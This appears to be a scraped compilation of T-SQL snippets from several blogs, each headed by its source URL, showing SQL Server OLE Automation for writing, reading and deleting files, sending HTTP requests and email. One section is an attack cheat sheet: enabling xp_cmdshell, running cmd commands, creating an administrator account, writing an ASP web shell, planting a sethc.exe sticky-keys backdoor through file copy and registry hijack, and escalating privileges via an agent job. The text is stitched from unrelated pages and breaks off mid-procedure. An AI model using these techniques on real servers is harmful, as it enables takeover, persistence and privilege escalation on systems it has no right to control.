    SELECT
    @data = CONVERT(VARBINARY(MAX), file_data, 1)
    , @fname = file_n
    , @xtn = file_x
    , @fPath = @outPutPath + '\' + file_n + file_x
    FROM @table WHERE id = @i

  EXEC sp_OACreate 'ADODB.Stream', @init OUTPUT; -- An instace created
  EXEC sp_OASetProperty @init, 'Type', 1; -- Set property value to the instance
  EXEC sp_OAMethod @init, 'Open'; -- Calling a method
  EXEC sp_OAMethod @init, 'Write', NULL, @data; -- Calling a method
  EXEC sp_OAMethod @init, 'SaveToFile', NULL, @fPath, 2; -- Calling a method
  EXEC sp_OAMethod @init, 'Close'; -- Calling a method
  EXEC sp_OADestroy @init; -- Closed the insatnce

--Reset the variables for next use
SELECT @data = NULL
, @fname = NULL
, @xtn = NULL
, @init = NULL
, @fPath = NULL

SET @i -= 1
END

https://www.sqlindia.com/file-system-operations-in-sql-server-using-ole-automation/

CREATE FUNCTION [dbo].[ufn_fileOperation]
(
@filPath VARCHAR (500),
@flg TINYINT = 1 -- 1 Select, 2 Stream, 3 Delete
)
RETURNS
@var TABLE
(
[FileName] varchar (500)
, [Type] varchar (200)
, [CreatedDate] datetime
, [LastAsscessedDate] datetime
, [LastModifiedDate] datetime
, [FullPath] varchar (500)
, [ShortPath] varchar (500)
, [Attribute] int
, [Operation] varchar(10)
, [FileText] varchar(max)
)
AS
BEGIN
DECLARE @init INT,
@fso INT,
@objFile INT,
@errObj INT,
@errMsg VARCHAR (500),
@fullPath VARCHAR (500),
@shortPath VARCHAR (500),
@objType VARCHAR (500),
@dateCreated datetime,
@dateLastAccessed datetime,
@dateLastModified datetime,
@attribute INT,
@objSize INT,
@fileName varchar (500),
@operation varchar(10),
@objStream INT,
@string varchar(max) = '',
@stringChunk varchar(8000),
@qBreak INT

SELECT
	@init = 0,
	@errMsg = 'Step01: File Open'
EXEC @init = sp_OACreate	'Scripting.FileSystemObject',
					@fso OUT
IF @init = 0 SELECT
	@errMsg = 'Step02: File Access '''
	+ @filPath + '''',
	@errObj = @fso
IF @init = 0 EXEC @init = sp_OAMethod	@fso,
								'GetFile',
								@objFile OUT,
								@filPath
IF @init = 0
SELECT
	@errMsg = 'Step03: Access Attributes'''
	+ @filPath + '''',
	@errObj = @objFile

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'Name',
									@fileName OUT

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'Type',
									@objType OUT

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'DateCreated',
									@dateCreated OUT

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'DateLastAccessed',
									@dateLastAccessed OUT

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'DateLastModified',
									@dateLastModified OUT

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'Attributes',
									@attribute OUT

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'size',
									@objSize OUT

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'Path',
									@fullPath OUT

IF @init = 0 EXEC @init = sp_OAGetProperty	@objFile,
									'ShortPath',
									@shortPath OUT

EXEC sp_OADestroy @fso
EXEC sp_OADestroy @objFile 

SELECT @fso = NULL, @objFile = NULL, @operation = 'Selected'

IF @flg = 2
BEGIN
    EXECUTE @init = sp_OACreate  'Scripting.FileSystemObject' , @fso OUT

    IF @init=0 EXECUTE @init = sp_OAMethod  @fso,
								    'OpenTextFile',
								    @objStream OUT,
								    @fullPath,
								    1,
								    false,
								    0
    WHILE @init = 0
    BEGIN
	   IF @init = 0 EXECUTE @init = sp_OAGetProperty @objStream, 'AtEndOfStream', @qBreak OUTPUT

	   IF @qBreak <> 0  BREAK

	   IF @init = 0 EXECUTE @init = sp_OAMethod  @objStream, 'Read', @stringChunk OUTPUT,4000
	   SELECT @String=@string+@stringChunk
    END

    IF @init=0 EXECUTE @init = sp_OAMethod  @objStream, 'Close'

    EXECUTE  sp_OADestroy @objStream
    EXEC sp_OADestroy @fso
    SET @operation = 'Stream'
END

SELECT @fso = NULL, @objFile = NULL

IF @flg = 3
BEGIN
EXEC @init = sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT
EXEC @init = sp_OAMethod @fso, 'DeleteFile', NULL, @fullPath
EXEC @init = sp_OADestroy @fso
SELECT @operation = 'Deleted'
END

INSERT INTO @var
	VALUES (@fileName, @objType, @dateCreated, @dateLastAccessed, @dateLastModified, @fullPath, @shortPath, @attribute, @operation, @string)

RETURN
END


SELECT * FROM [ufn_fileOperation]  ('E:\others\Lab_SQLIndia\TextFile.txt', 1)
SELECT * FROM [ufn_fileOperation]  ('\\192.168.1.7\e\others\Lab_SQLIndia\Database Mirroring Using T-SQL.doc', 1)

SELECT * FROM [ufn_fileOperation]  ('E:\others\Lab_SQLIndia\TextFile.txt', 2)
SELECT * FROM [ufn_fileOperation]  ('\\192.168.1.7\e\others\Lab_SQLIndia\Database Mirroring Using T-SQL.doc', 2)



https://www.sqlindia.com/compare-two-xml-data-in-sql-server/



CREATE FUNCTION [dbo].[CompareXmlData]
(
@xml1 XML,
@xml2 XML
)
RETURNS INT
AS
BEGIN
DECLARE @ret INT
SELECT
	@ret = 0


-- -------------------------------------------------------------
-- If one of the arguments is NULL then we assume that they are
-- not equal. 
-- -------------------------------------------------------------
IF @xml1 IS NULL OR @xml2 IS NULL
BEGIN
RETURN 1
END

-- -------------------------------------------------------------
-- Match the name of the elements 
-- -------------------------------------------------------------
IF (SELECT
	@xml1.value('(local-name((/*)[1]))', 'VARCHAR(MAX)'))
< >
(SELECT
	@xml2.value('(local-name((/*)[1]))', 'VARCHAR(MAX)'))
BEGIN
RETURN 1
END

---------------------------------------------------------------
--Match the value of the elements
---------------------------------------------------------------
IF ((@xml1.query ('count(/*)').value ('.', 'INT') = 1) AND (@xml2.query ('count(/*)').value ('.', 'INT') = 1))
BEGIN
DECLARE @elValue1 VARCHAR (MAX), @elValue2 VARCHAR (MAX)

SELECT
	@elValue1 = @xml1.value('((/*)[1])', 'VARCHAR(MAX)'),
	@elValue2 = @xml2.value('((/*)[1])', 'VARCHAR(MAX)')

IF @elValue1 < > @elValue2
BEGIN
RETURN 1
END
END

-- -------------------------------------------------------------
-- Match the number of attributes 
-- -------------------------------------------------------------
DECLARE @attCnt1 INT, @attCnt2 INT
SELECT
	@attCnt1 = @xml1.query('count(/*/@*)').value('.', 'INT'),
	@attCnt2 = @xml2.query('count(/*/@*)').value('.', 'INT')

IF @attCnt1 < > @attCnt2 BEGIN
RETURN 1
END


-- -------------------------------------------------------------
-- Match the attributes of attributes 
-- Here we need to run a loop over each attribute in the 
-- first XML element and see if the same attribut exists
-- in the second element. If the attribute exists, we
-- need to check if the value is the same.
-- -------------------------------------------------------------
DECLARE @cnt INT, @cnt2 INT
DECLARE @attName VARCHAR (MAX)
DECLARE @attValue VARCHAR (MAX)

SELECT
	@cnt = 1

WHILE @cnt < = @attCnt1
BEGIN
SELECT
	@attName = NULL,
	@attValue = NULL
SELECT
	@attName = @xml1.value(
	'local-name((/*/@*[sql:variable("@cnt")])[1])',
	'varchar(MAX)'),
	@attValue = @xml1.value(
	'(/*/@*[sql:variable("@cnt")])[1]',
	'varchar(MAX)')

-- check if the attribute exists in the other XML document
IF @xml2.exist (
'(/*/@*[local-name()=sql:variable("@attName")])[1]'
) = 0
BEGIN
RETURN 1
END

IF @xml2.value (
'(/*/@*[local-name()=sql:variable("@attName")])[1]',
'varchar(MAX)')
< >
@attValue
BEGIN
RETURN 1
END

SELECT
	@cnt = @cnt + 1
END

-- -------------------------------------------------------------
-- Match the number of child elements 
-- -------------------------------------------------------------
DECLARE @elCnt1 INT, @elCnt2 INT
SELECT
	@elCnt1 = @xml1.query('count(/*/*)').value('.', 'INT'),
	@elCnt2 = @xml2.query('count(/*/*)').value('.', 'INT')


IF @elCnt1 < > @elCnt2
BEGIN
RETURN 1
END


-- -------------------------------------------------------------
-- Start recursion for each child element
-- -------------------------------------------------------------
SELECT
	@cnt = 1
SELECT
	@cnt2 = 1
DECLARE @x1 XML, @x2 XML
DECLARE @noMatch INT

WHILE @cnt < = @elCnt1
BEGIN

SELECT
	@x1 = @xml1.query('/*/*[sql:variable("@cnt")]')
--RETURN CONVERT(VARCHAR(MAX),@x1)
WHILE @cnt2 < = @elCnt2
BEGIN
SELECT
	@x2 = @xml2.query('/*/*[sql:variable("@cnt2")]')
SELECT
	@noMatch = dbo.CompareXml(@x1, @x2)
IF @noMatch = 0 BREAK
SELECT
	@cnt2 = @cnt2 + 1
END

SELECT
	@cnt2 = 1

IF @noMatch = 1
BEGIN
RETURN 1
END

SELECT
	@cnt = @cnt + 1
END

RETURN @ret
END










https://www.sqlservergeeks.com/t-sql-script-to-delete-files/



-- using OLE Automation Procedures 
exec sp_configure
GO
-- enable Ole Automation Procedures
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
DECLARE @Filehandle int

-- create a file system object
EXEC sp_OACreate 'Scripting.FileSystemObject', @Filehandle OUTPUT
-- delete file 
EXEC sp_OAMethod @Filehandle, 'DeleteFile', NULL, 'E:\Deleted\del01.txt'
-- memory cleanup
EXEC sp_OADestroy @Filehandle





https://midnightprogrammer.net/page/27/


Create Procedure  [dbo].[USP_SaveFile](@text as NVarchar(Max),@Filename Varchar(200)) 
AS
Begin
   
declare @Object int,
        @rc int, -- the return code from sp_OA procedures 
        @FileID Int
   
EXEC @rc = sp_OACreate 'Scripting.FileSystemObject', @Object OUT
EXEC @rc = sp_OAMethod  @Object , 'OpenTextFile' , @FileID OUT , @Filename , 2 , 1 
Set  @text = Replace(Replace(Replace(@text,'&','&'),'<' ,'<'),'>','>')
EXEC @rc = sp_OAMethod  @FileID , 'WriteLine' , Null , @text  
Exec @rc = master.dbo.sp_OADestroy @FileID   
   
Declare @Append  bit
Select  @Append = 0
   
If @rc <> 0
Begin
    Exec @rc = master.dbo.sp_OAMethod @Object, 'SaveFile',null,@text ,@Filename,@Append
         
End
  
Exec @rc = master.dbo.sp_OADestroy @Object 
      
End
https://jarrettmeyer.com/2017/07/08/sql-server-sending-http-requests


DECLARE @authHeader NVARCHAR(64);
DECLARE @contentType NVARCHAR(64);
DECLARE @postData NVARCHAR(2000);
DECLARE @responseText NVARCHAR(2000);
DECLARE @responseXML NVARCHAR(2000);
DECLARE @ret INT;
DECLARE @status NVARCHAR(32);
DECLARE @statusText NVARCHAR(32);
DECLARE @token INT;
DECLARE @url NVARCHAR(256);

SET @authHeader = 'BASIC 0123456789ABCDEF0123456789ABCDEF';
SET @contentType = 'application/x-www-form-urlencoded';
SET @postData = 'value1=Hello&value2=World';
SET @url = 'https://en43ylz3txlaz.x.pipedream.net';

-- Open the connection.
EXEC @ret = sp_OACreate 'MSXML2.ServerXMLHTTP', @token OUT;
IF @ret <> 0 RAISERROR('Unable to open HTTP connection.', 10, 1);

-- Send the request.
EXEC @ret = sp_OAMethod @token, 'open', NULL, 'POST', @url, 'false';
EXEC @ret = sp_OAMethod @token, 'setRequestHeader', NULL, 'Authentication', @authHeader;
EXEC @ret = sp_OAMethod @token, 'setRequestHeader', NULL, 'Content-type', @contentType;
EXEC @ret = sp_OAMethod @token, 'send', NULL, @postData;

-- Handle the response.
EXEC @ret = sp_OAGetProperty @token, 'status', @status OUT;
EXEC @ret = sp_OAGetProperty @token, 'statusText', @statusText OUT;
EXEC @ret = sp_OAGetProperty @token, 'responseText', @responseText OUT;

-- Show the response.
PRINT 'Status: ' + @status + ' (' + @statusText + ')';
PRINT 'Response text: ' + @responseText;

-- Close the connection.
EXEC @ret = sp_OADestroy @token;
IF @ret <> 0 RAISERROR('Unable to close HTTP connection.', 10, 1);




https://www.botreetechnologies.com/blog/how-to-fire-a-web-request-from-microsoft-sql-server/


CREATE procedure [dbo].[change_order_status](
@order_number varchar(max),
@delivery_status int
)
as
// Variable declaration
DECLARE @authHeader NVARCHAR(64);
DECLARE @contentType NVARCHAR(64);
DECLARE @postData NVARCHAR(2000);
DECLARE @responseText NVARCHAR(2000);
DECLARE @responseXML NVARCHAR(2000);
DECLARE @ret INT;
DECLARE @status NVARCHAR(32);
DECLARE @statusText NVARCHAR(32);
DECLARE @token INT;
DECLARE @url NVARCHAR(256);
// Set Authentications
SET @authHeader = 'BASIC 0123456789ABCDEF0123456789ABCDEF';
SET @contentType = 'application/x-www-form-urlencoded';
// Set your desired url where you want to fire request
SET @url = 'rel="noopener">http://localhost:3000/api/v1/orders/update_status?' + 'id=' + @order_number + '&delivery_status=' + cast(@delivery_status as varchar)
// Open a connection
EXEC @ret = sp_OACreate 'MSXML2.ServerXMLHTTP', @token OUT;
IF @ret <> 0 RAISERROR('Unable to open HTTP connection.', 10, 1);
// make a request
EXEC @ret = sp_OAMethod @token, 'open', NULL, 'POST', @url, 'false';
EXEC @ret = sp_OAMethod @token, 'setRequestHeader', NULL, 'Authentication', @authHeader;
EXEC @ret = sp_OAMethod @token, 'setRequestHeader', NULL, 'Content-type', @contentType;
EXEC @ret = sp_OAMethod @token, 'send'
// Handle responce
EXEC @ret = sp_OAGetProperty @token, 'status', @status OUT;
EXEC @ret = sp_OAGetProperty @token, 'statusText', @statusText OUT;
EXEC @ret = sp_OAGetProperty @token, 'responseText', @responseText OUT;
// Print responec
PRINT 'Status: ' + @status + ' (' + @statusText + ')';
PRINT 'Response text: ' + @responseText;


CREATE TRIGGER [dbo].[update_order_state]
ON [dbo].[orders]
AFTER UPDATE
AS
DECLARE @order_number varchar(max)
DECLARE @delivery_status int
// set values to local variables for passing to stored procedure
SELECT @order_number = order_number from inserted
SELECT @delivery_status = delivery_status FROM inserted
// call stored procedure
EXEC change_order_status @order_number,@delivery_status



UPDATE orders SET
[delivery_status] = 1
WHERE
order_number = 'order_2'

https://www.programmersought.com/article/15694214348/


1.
Open and close xp_cmdshell
EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;– open xp_cmdshell
EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 0;RECONFIGURE;– Guanbi xp_cmdshell
EXEC sp_configure ‘show advanced options’, 0; GO RECONFIGURE WITH OVERRIDE; disable advanced options

2.
xp_cmdshell execute command
EXEC master..xp_cmdshell ‘ipconfig’

3.
Open and close sp_oacreate
exec sp_configure ‘show advanced options’, 1;RECONFIGURE;exec sp_configure ‘Ole Automation Procedures’,1;RECONFIGURE; open
exec sp_configure ‘show advanced options’, 1;RECONFIGURE;exec sp_configure ‘Ole Automation Procedures’,0;RECONFIGURE; Guan Bi
EXEC sp_configure ‘show advanced options’, 0; GO RECONFIGURE WITH OVERRIDE; disable advanced options

4.
sp_OACreate delete file
DECLARE @Result int
DECLARE @FSO_Token int
EXEC @Result = sp_OACreate ‘Scripting.FileSystemObject’, @FSO_Token OUTPUT
EXEC @Result = sp_OAMethod @FSO_Token, ‘DeleteFile’, NULL, ‘C:\Documents and Settings\All Users\Start Menu\Programs\Startup\user.bat’
EXEC @Result = sp_OADestroy @FSO_Token

5.
sp_OACreate copy file
declare @o int
exec sp_oacreate ‘scripting.filesystemobject’, @o out
exec sp_oamethod @o, ‘copyfile’,null,’c:\windows\explorer.exe’ ,’c:\windows\system32\sethc.exe’;

6.
sp_OACreate mobile file
declare @aa int
exec sp_oacreate ‘scripting.filesystemobject’, @aa out
exec sp_oamethod @aa, ‘moveFile’,null,’c:\temp\ipmi.log’, ‘c:\temp\ipmi1.log’;

7.
sp_OACreate plus administrator user

DECLARE @js int
EXEC sp_OACreate ‘ScriptControl’,@js OUT
EXEC sp_OASetProperty @js, ‘Language’, ‘JavaScript’
EXEC sp_OAMethod @js, ‘Eval’, NULL, ‘var o=new ActiveXObject(“Shell.Users”);z=o.create(“user”);z.changePassword(“pass”,””);z.setting(“AccountType”)=3;’

8.
Open and close sp_makewebtask
exec sp_configure ‘show advanced options’, 1;RECONFIGURE;exec sp_configure ‘Web Assistant Procedures’,1;RECONFIGURE; open
exec sp_configure ‘show advanced options’, 1;RECONFIGURE;exec sp_configure ‘Web Assistant Procedures’,0;RECONFIGURE; Guan Bi
EXEC sp_configure ‘show advanced options’, 0; GO RECONFIGURE WITH OVERRIDE; disable advanced options

9.
sp_makewebtask new file
exec sp_makewebtask ‘c:\windows.txt’,’ select ”<%25execute(request(“a”))%25>” ‘;;–

10.
wscript.shell execute command
use master
declare @o int
exec sp_oacreate ‘wscript.shell’,@o out
exec sp_oamethod @o,’run’,null,’cmd /c “net user” > c:\test.tmp’

11.
Shell.Application execute command
declare @o int
exec sp_oacreate ‘Shell.Application’, @o out
exec sp_oamethod @o, ‘ShellExecute’,null, ‘cmd.exe’,’cmd /c net user >c:\test.txt’,’c:\windows\system32′,”,’1′;
or
exec sp_oamethod @o, ‘ShellExecute’,null, ‘user.vbs’,”,’c:\’,”,’1′;

12.
Open and close openrowset
exec sp_configure ‘show advanced options’, 1;RECONFIGURE;exec sp_configure ‘Ad Hoc Distributed Queries’,1;RECONFIGURE; open
exec sp_configure ‘show advanced options’, 1;RECONFIGURE;exec sp_configure ‘Ad Hoc Distributed Queries’,0;RECONFIGURE; Guan Bi
EXEC sp_configure ‘show advanced options’, 0; GO RECONFIGURE WITH OVERRIDE; disable advanced options

13.
Sandbox execution command
exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’, 1 defaults to 3
select * from openrowset(‘microsoft.jet.oledb.4.0′,’;database=c:\windows\system32\ias\ias.mdb’,’select shell(“cmd.exe /c echo a>c:\b.txt”)’)

14.
Registry hijack paste key
exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution
Options\sethc.EXE’,’Debugger’,’REG_SZ’,’C:\WINDOWS\explorer.exe’;

15.
sp_oacreate replace paste key
declare @o int
exec sp_oacreate ‘scripting.filesystemobject’, @o out
exec sp_oamethod @o, ‘copyfile’,null,’c:\windows\explorer.exe’ ,’c:\windows\system32\sethc.exe’;
declare @oo int
exec sp_oacreate ‘scripting.filesystemobject’, @oo out exec sp_oamethod @oo, ‘copyfile’,null,’c:\windows\system32\sethc.exe’ ,’c:\windows\system32\dllcache\sethc.exe’;

16.
Public permission elevation operation
USE msdb
EXEC sp_add_job @job_name = ‘GetSystemOnSQL’, www.xxx.com
@enabled = 1,
@description = ‘This will give a low privileged user access to
xp_cmdshell’,
@delete_level = 1

EXEC sp_add_jobstep @job_name = ‘GetSystemOnSQL’,
@step_name = ‘Exec my sql’,
@subsystem = ‘TSQL’,
@command = ‘exec master..xp_execresultset N”select ””exec
master..xp_cmdshell “dir > c:\agent-job-results.txt””””,N”Master”’
EXEC sp_add_jobserver @job_name = ‘GetSystemOnSQL’,
@server_name = ‘SERVER_NAME’
EXEC sp_start_job @job_name = ‘GetSystemOnSQL’






http://hksqlserverdoc.blogspot.com/2018/12/export-query-result-in-csv-file-using-t.html


USE master
GO
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
USE TESTDB
ALTER AUTHORIZATION ON DATABASE::[TESTDB] TO sa
GO
-- =============================================
-- Author:  Peter Lee
-- Description: Convert local temp table #TempTblCSV into a CSV string variable
-- =============================================
CREATE OR ALTER PROCEDURE ConvertLocalTempIntoCSV
 @csvOutput nvarchar(max) OUTPUT
AS
BEGIN
 SET NOCOUNT ON;
 -- get list of columns
 DECLARE @cols nvarchar(4000);
 SELECT @cols = COALESCE(@cols + ' + '', '' + ' + 'CAST([' + name + '] AS nvarchar(4000))', 'CAST([' + name +'] AS nvarchar(4000))')
  FROM tempdb.sys.columns WHERE [object_id] = OBJECT_ID('tempdb..#TempTblCSV') ORDER BY column_id;
 CREATE TABLE #TempRows (r nvarchar(4000));
 EXEC('INSERT #TempRows SELECT ' + @cols + ' FROM #TempTblCSV');
 SELECT @csvOutput = COALESCE(@csvOutput + CHAR(13)+CHAR(10) + r, r) FROM #TempRows;
END
GO
/****** Object:  StoredProcedure [TLB].[WriteToFile] ******/
CREATE OR ALTER PROC [WriteToFile]
 @file varchar(2000),
 @text nvarchar(max)
WITH EXECUTE AS 'dbo'
AS  
 DECLARE @ole int;
 DECLARE @fileId int;
 DECLARE @hr int;
 EXECUTE @hr = master.dbo.sp_OACreate 'Scripting.FileSystemObject', @ole OUT;
 IF @hr <> 0 
 BEGIN 
  RAISERROR('Error %d creating object.', 16, 1, @hr)
  RETURN
 END
 EXECUTE @hr = master.dbo.sp_OAMethod @ole, 'OpenTextFile', @fileId OUT, @file, 2, 1;  -- overwrite & ALTER if not exist
 IF @hr <> 0 
 BEGIN 
  RAISERROR('Error %d opening file.', 16, 1, @hr)
  RETURN
 END
 EXECUTE @hr = master.dbo.sp_OAMethod @fileId, 'WriteLine', Null, @text;
 IF @hr <> 0 
 BEGIN 
  RAISERROR('Error %d writing file.', 16, 1, @hr)
  RETURN
 END
 EXECUTE @hr = master.dbo.sp_OADestroy @fileId;
 IF @hr <> 0 
 BEGIN 
  RAISERROR('Error %d closing file.', 16, 1, @hr)
  RETURN
 END
 EXECUTE master.dbo.sp_OADestroy @ole;
GO
-- Create a local temp table, name must be #TempTblCSV
-- you can define any columns inside, e.g.
CREATE TABLE #TempTblCSV (pk int, col1 varchar(9), dt datetime2(0));
-- Fill the local temp table with your query result, e.g.
INSERT #TempTblCSV VALUES (1, 'a', '20180112 12:00');
INSERT #TempTblCSV VALUES (2, 'b', '20180113 13:00');
INSERT #TempTblCSV VALUES (3, 'c', '20180113 14:00');
-- convert the local temp table data into a string variable, which is the CSV content
DECLARE @csv nvarchar(max);
EXEC ConvertLocalTempIntoCSV @csv OUTPUT;
-- write the CSV content into a file
EXEC WriteToFile 'H:\TEMP\PETER\output.csv', @csv;
-- Not a must if to drop the temp table, especially if you're writing a stored proc
DROP TABLE #TempTblCSV;




https://sqlfromhell.wordpress.com/tag/ole-automation-procedures/

USE master
GO
 
CREATE LOGIN [Maria] WITH PASSWORD=N'1234'
, CHECK_EXPIRATION=OFF
, CHECK_POLICY=OFF
GO
 
CREATE USER [Maria] FOR LOGIN [Maria]
GO
 
GRANT EXECUTE ON sys.sp_OACreate TO [Maria]
GO
 
GRANT EXECUTE ON sys.sp_OAMethod TO [Maria]
GO
 
GRANT EXECUTE ON sys.sp_OADestroy TO [Maria]
GO
 
EXECUTE AS LOGIN = 'Maria'
GO

DECLARE @objHTTP INT, @url VARCHAR(255)
 
DECLARE @return INT, @responseXml INT, @text NVARCHAR(4000), @xml XML
 
-- Criando a 'instância' do componentes
 
EXEC @return = sp_OACreate 'Microsoft.XMLHTTP', @objHTTP OUT
 
-- Componente alternativo
 
-- EXEC @return = sp_OACreate 'Msxml2.XMLHTTP', @objHTTP OUT
 
-- Verificando se a chamada obteve sucesso.
 
IF @return = 0 PRINT 'COM... OK'
 
SET @url = 'http://www.webservicex.net/globalweather.asmx/GetWeather?CityName=CURITIBA&CountryName=BRAZIL'
 
-- Chamando o método Open, informando a url
 
EXEC @return = sp_OAMethod @objHTTP, 'Open', NULL, 'GET', @url, 0
 
IF @return = 0 PRINT 'Open... OK'
 
-- Chamando o método Send
 
EXEC @return = sp_OAMethod @objHTTP, 'Send'
 
IF @return = 0 PRINT 'Send... OK'
 
-- Recuperando a resposta do Web Service
 
EXEC @return = sp_OAMethod @objHTTP, 'ResponseXML', @responseXml OUT
 
IF @return = 0 PRINT 'ResponseXML... OK'
 
-- Extraindo uma parte específica da resposta
 
EXEC @return = sp_OAMethod @responseXml, 'Text', @text OUT
 
IF @return = 0 PRINT 'Text... OK'
 
-- Recuperando a temperatura
 
SET @xml = CAST(@text AS XML)
 
SELECT @xml.value('(/CurrentWeather/Temperature)[1]', 'varchar(20)')
 
GO




https://www.c-sharpcorner.com/code/2152/sending-mail-in-sql-server.aspx


CREATE PROCEDURE [dbo].[sp_send_mail]  
        @from varchar(500) ,  
        @to varchar(500) ,  
        @subject varchar(500),  
        @body varchar(4000) ,  
        @bodytype varchar(10),  
        @output_mesg varchar(10) output,  
        @output_desc varchar(1000) output  
AS  
DECLARE @imsg int  
DECLARE @hr int  
DECLARE @source varchar(255)  
DECLARE @description varchar(500)  
  
EXEC @hr = sp_oacreate 'cdo.message', @imsg out  
  
EXEC @hr = sp_oasetproperty @imsg,  
'configuration.fields("http://schemas.microsoft.com/cdo/configuration/sendusing").value','2'  
  
--SMTP Server  
EXEC @hr = sp_oasetproperty @imsg,   
  'configuration.fields("http://schemas.microsoft.com/cdo/configuration/smtpserver").value',   
  'smtp.gmail.com'   
  
--UserName  
EXEC @hr = sp_oasetproperty @imsg,   
  'configuration.fields("http://schemas.microsoft.com/cdo/configuration/sendusername").value',   
  'sender@gmail.com'   
  
--Password  
EXEC @hr = sp_oasetproperty @imsg,   
  'configuration.fields("http://schemas.microsoft.com/cdo/configuration/sendpassword").value',   
  'xxxxxx'   
  
--UseSSL  
EXEC @hr = sp_oasetproperty @imsg,   
  'configuration.fields("http://schemas.microsoft.com/cdo/configuration/smtpusessl").value',   
  'True'   
  
--PORT   
EXEC @hr = sp_oasetproperty @imsg,   
  'configuration.fields("http://schemas.microsoft.com/cdo/configuration/smtpserverport").value',   
  '465'   
  
--Requires Aunthentication None(0) / Basic(1)  
EXEC @hr = sp_oasetproperty @imsg,   
  'configuration.fields("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate").value',   
  '1'   
  
EXEC @hr = sp_oamethod @imsg, 'configuration.fields.update', null  
EXEC @hr = sp_oasetproperty @imsg, 'to', @to  
EXEC @hr = sp_oasetproperty @imsg, 'from', @from  
EXEC @hr = sp_oasetproperty @imsg, 'subject', @subject  
  
-- if you are using html e-mail, use 'htmlbody' instead of 'textbody'.  
  
EXEC @hr = sp_oasetproperty @imsg, @bodytype, @body  
EXEC @hr = sp_oamethod @imsg, 'send', null  
  
SET @output_mesg = 'Success'  
  
-- sample error handling.  
IF @hr <>0   
    SELECT @hr  
    BEGIN  
        EXEC @hr = sp_oageterrorinfo null, @source out, @description out  
        IF @hr = 0  
        BEGIN  
            --set @output_desc = ' source: ' + @source  
            set @output_desc =  @description  
        END  
    ELSE  
    BEGIN  
        SET @output_desc = ' sp_oageterrorinfo failed'  
    END  
    IF not @output_desc is NULL  
            SET @output_mesg = 'Error'  
END  
EXEC @hr = sp_oadestroy @imsg  


DECLARE @out_desc varchar(1000),  
        @out_mesg varchar(10)  
  
EXEC sp_send_mail 'travispadilla112@gmail.com',  
    'travispadilla112@gmail.com',  
    'Hii',   
    '<b>Sending Test Mail</b>',  
    'htmlbody', @output_mesg = @out_mesg output, @output_desc = @out_desc output  
  
PRINT @out_mesg  
PRINT @out_desc  




https://blog.thoward37.me/articles/code-snippet-sql-fileexists/


-- Using the scripting object
CREATE FUNCTION FileExists(@File varchar(255)) RETURNS BIT AS
BEGIN
declare @objFSys int
declare @i int

exec sp_OACreate 'Scripting.FileSystemObject', @objFSys out
exec sp_OAMethod @objFSys, 'FileExists', @i out, @File
exec sp_OADestroy @objFSys

return @i
END 

https://jahsoncodes.blogspot.com/2017/12/how-to-call-rest-api-from-trigger.html?m=1

--create/alter a stored proceudre  accordingly
create procedure webRequest
as 
DECLARE @authHeader NVARCHAR(64);
DECLARE @contentType NVARCHAR(64);
DECLARE @postData NVARCHAR(2000);
DECLARE @responseText NVARCHAR(2000);
DECLARE @responseXML NVARCHAR(2000);
DECLARE @ret INT;
DECLARE @status NVARCHAR(32);
DECLARE @statusText NVARCHAR(32);
DECLARE @token INT;
DECLARE @url NVARCHAR(256);
DECLARE @Authorization NVARCHAR(200);

--set your post params
SET @authHeader = 'BASIC 0123456789ABCDEF0123456789ABCDEF';
SET @contentType = 'application/x-www-form-urlencoded';
SET @postData = 'KeyValue1=value1&KeyValue2=value2'
SET @url = 'set your url end point here'

-- Open the connection.
EXEC @ret = sp_OACreate 'MSXML2.ServerXMLHTTP', @token OUT;
IF @ret <> 0 RAISERROR('Unable to open HTTP connection.', 10, 1);

-- Send the request.
EXEC @ret = sp_OAMethod @token, 'open', NULL, 'POST', @url, 'false';
--set a custom header Authorization is the header key and VALUE is the value in the header
EXEC sp_OAMethod @token, 'SetRequestHeader', NULL, 'Authorization', 'VALUE'

EXEC @ret = sp_OAMethod @token, 'setRequestHeader', NULL, 'Authentication', @authHeader;
EXEC @ret = sp_OAMethod @token, 'setRequestHeader', NULL, 'Content-type', @contentType;
EXEC @ret = sp_OAMethod @token, 'send', NULL, @postData;

-- Handle the response.
EXEC @ret = sp_OAGetProperty @token, 'status', @status OUT;
EXEC @ret = sp_OAGetProperty @token, 'statusText', @statusText OUT;
EXEC @ret = sp_OAGetProperty @token, 'responseText', @responseText OUT;

-- Show the response.
PRINT 'Status: ' + @status + ' (' + @statusText + ')';
PRINT 'Response text: ' + @responseText;

-- Close the connection.
EXEC @ret = sp_OADestroy @token;
IF @ret <> 0 RAISERROR('Unable to close HTTP connection.', 10, 1);
go




https://sunilreddyenugala.wordpress.com/2013/06/06/ole-automation-procedures-to-check-the-source-file-existence/


DECLARE 
  @Filename VARCHAR(100) = 'D:\DelmeSoon.txt'  
                 --give your filename with folderpath
  ,@hr INT 
  ,@objFileSystem INT
  ,@objFile INT
  ,@ErrorObject INT
  ,@ErrorMessage VARCHAR(255)
  ,@Path VARCHAR(100)
  ,@size INT
  
  
   
  EXEC @hr = sp_OACreate 'Scripting.FileSystemObject'
      ,@objFileSystem OUT
   
  IF @hr <> 0
  BEGIN
      SET @errorMessage = 'Error in creating the file system object.'
   
      RAISERROR (
              @errorMessage
              ,16
              ,1
              )
  END
  ELSE
  BEGIN
